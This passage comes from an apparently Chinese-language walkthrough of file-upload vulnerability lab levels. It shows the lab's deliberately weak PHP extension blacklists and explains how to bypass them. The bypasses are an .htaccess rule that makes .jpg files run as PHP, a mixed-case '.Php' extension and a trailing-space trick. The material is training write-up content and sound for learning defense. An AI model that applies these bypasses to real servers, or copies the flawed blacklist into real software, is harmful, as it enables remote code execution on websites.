punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 收尾去空</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_ext</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$deny_ext</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token variable\">$temp_file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token variable\">$img_path</span> <span class=\"token operator\">=</span> <span class=\"token constant\">UPLOAD_PATH</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'/'</span><span class=\"token operator\">.</span><span class=\"token variable\">$file_name</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$temp_file</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$img_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                <span class=\"token variable\">$is_upload</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'上传出错！'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'此文件不允许上传!'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token constant\">UPLOAD_PATH</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'文件夹不存在,请手工创建！'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>拉黑了更多后缀</pre></td></tr></table></figure><p>上面把能被解析的都给拉黑了，这时如果没有禁止上传.htaccess 后缀文件</p>\n<p>上传模块，黑名单过滤了所有的能执行的后缀名，如果允许上传.htaccess。htaccess 文件的作用是 可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定 IP 地址的用户、只允许特定 IP 地址的用户、禁止目录列表，以及使用其他文件作为 index 文件等一些功能。</p>\n<p>在 htaccess 里写入 SetHandler application/x-httpd-php 则可以文件重写成 php 文件。要 htaccess 的规则生效 则需要在 apache 开启 rewrite 重写模块，因为 apache 是多数都开启这个模块，所以规则一般都生效。</p>\n<p>创建一个文件里面的内容是</p>\n<p>&lt;FilesMatch “jpg”&gt;</p>\n<p>SetHandler application/x-httpd-php</p>\n</FilesMatch>\n<p>就可以把 jpg 当 php 文件解析</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1697617287773-4e850ec6-e75a-461a-b6d0-a65f0a9d54c7.png\" alt=\"img\"></p>\n<h4 id=\"第五关-大小写绕过\"><a class=\"markdownIt-Anchor\" href=\"#第五关-大小写绕过\">#</a> <span class=\"label warning\">第五关 大小写绕过</span></h4>\n<p>这关代码没有对上传的文件后缀进行小写转换</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">include</span> <span class=\"token string single-quoted-string\">'../config.php'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">include</span> <span class=\"token string single-quoted-string\">'../common.php'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">include</span> <span class=\"token string single-quoted-string\">'../head.php'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">include</span> <span class=\"token string single-quoted-string\">'../menu.php'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token variable\">$is_upload</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'submit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">file_exists</span><span class=\"token punctuation\">(</span><span class=\"token constant\">UPLOAD_PATH</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token variable\">$deny_ext</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\".php\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".php5\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".php4\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".php3\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".php2\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".html\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".htm\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".phtml\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".pht\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".pHp\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".pHp5\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".pHp4\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".pHp3\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".pHp2\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".Html\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".Htm\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".pHtml\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jsp\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jspa\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jspx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jsw\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jsv\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jspf\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jtml\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jSp\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jSpx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jSpa\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jSw\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jSv\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jSpf\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jHtml\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".asp\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".aspx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".asa\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".asax\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".ascx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".ashx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".asmx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".cer\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".aSp\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".aSpx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".aSa\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".aSax\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".aScx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".aShx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".aSmx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".cEr\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".sWf\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".swf\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".htaccess\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token variable\">$file_name</span> <span class=\"token operator\">=</span> <span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token variable\">$file_name</span> <span class=\"token operator\">=</span> <span class=\"token function\">deldot</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 删除文件名末尾的点</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token variable\">$file_ext</span> <span class=\"token operator\">=</span> <span class=\"token function\">strrchr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_name</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'.'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token variable\">$file_ext</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_ireplace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'::$DATA'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file_ext</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 去除字符串::$DATA</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token variable\">$file_ext</span> <span class=\"token operator\">=</span> <span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_ext</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 首尾去空</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        </pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_ext</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$deny_ext</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            <span class=\"token variable\">$temp_file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            <span class=\"token variable\">$img_path</span> <span class=\"token operator\">=</span> <span class=\"token constant\">UPLOAD_PATH</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'/'</span><span class=\"token operator\">.</span><span class=\"token variable\">$file_name</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$temp_file</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$img_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>                <span class=\"token variable\">$is_upload</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'上传出错！'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'此文件类型不允许上传！'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token constant\">UPLOAD_PATH</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'文件夹不存在,请手工创建！'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>.php&quot;,“.php5”,“.php4”,“.php3”,“.php2”,“.html”,“.htm”,“.phtml”,“.pht”,“.pHp”,“.pHp5”,“.pHp4”,“.pHp3”,“.pHp2”,“.Html”,“.Htm”,“.pHtml”,“.jsp”,“.jspa”,“.jspx”,“.jsw”,“.jsv”,“.jspf”,“.jtml”,“.jSp”,“.jSpx”,“.jSpa”,“.jSw”,“.jSv”,“.jSpf”,“.jHtml”,“.asp”,“.aspx”,“.asa”,“.asax”,“.ascx”,“.ashx”,“.asmx”,“.cer”,“.aSp”,“.aSpx”,“.aSa”,“.aSax”,“.aScx”,“.aShx”,“.aSmx”,“.cEr”,“.sWf”,“.swf”,“.htaccess”);</p>\n<p>观察拦截的后缀 可以使用  .Php 后缀绕过</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1697618680971-6fc29574-64e5-47ab-bcd7-b692374a7c09.png\" alt=\"img\"></p>\n<h4 id=\"第六关-空格绕过\"><a class=\"markdownIt-Anchor\" href=\"#第六关-空格绕过\">#</a> <span class=\"label warning\">第六关 空格绕过</span></h4>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$is_upload</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'submit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">file_exists</span><span class=\"token punctuation\">(</span><span class=\"token constant\">UPLOAD_PATH</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token variable\">$deny_ext</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\".php\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".php5\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".php4\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".php3\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".php2\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".html\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".htm\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".phtml\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".pht\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".pHp\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".pHp5\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".pHp4\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".pHp3\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".pHp2\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".Html\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".Htm\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".pHtml\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jsp\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jspa\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jspx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jsw\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jsv\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jspf\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jtml\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jSp\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jSpx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jSpa\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jSw\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jSv\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jSpf\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jHtml\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".asp\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".aspx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".asa\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".asax\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".ascx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".ashx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".asmx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".cer\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".aSp\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".aSpx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".aSa\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".aSax\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".aScx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".aShx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".aSmx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".cEr\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".sWf\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".swf\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".htaccess\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".ini\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token variable\">$file_name</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token variable\">$file_name</span> <span class=\"token operator\">=</span> <span class=\"token function\">deldot</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 删除文件名末尾的点</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token variable\">$file_ext</span> <span class=\"token operator\">=</span> <span class=\"token function\">strrchr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_name</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'.'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token variable\">$file_ext</span> <span class=\"token operator\">=</span> <span class=\"token function\">strtolower</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_ext</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 转换为小写</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token variable\">$file_ext</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_ireplace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'::$DATA'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file_ext</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 去除字符串::$DATA</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_ext</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$deny_ext</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token variable\">$temp_file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token variable\">$img_path</span> <span class=\"token operator\">=</span> <span class=\"token constant\">UPLOAD_PATH</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'/'</span><span class=\"token operator\">.</span><span class=\"token function\">date</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"YmdHis\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token number\">1000</span><span class=\"token punctuation\">,</span><span class=\"token number\">9999</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token variable\">$file_ext</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$temp_file</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$img_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>                <span class=\"token variable\">$is_upload</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'上传出错！'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'此文件不允许上传'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token constant\">UPLOAD_PATH</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'文件夹不存在,请手工创建！'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token 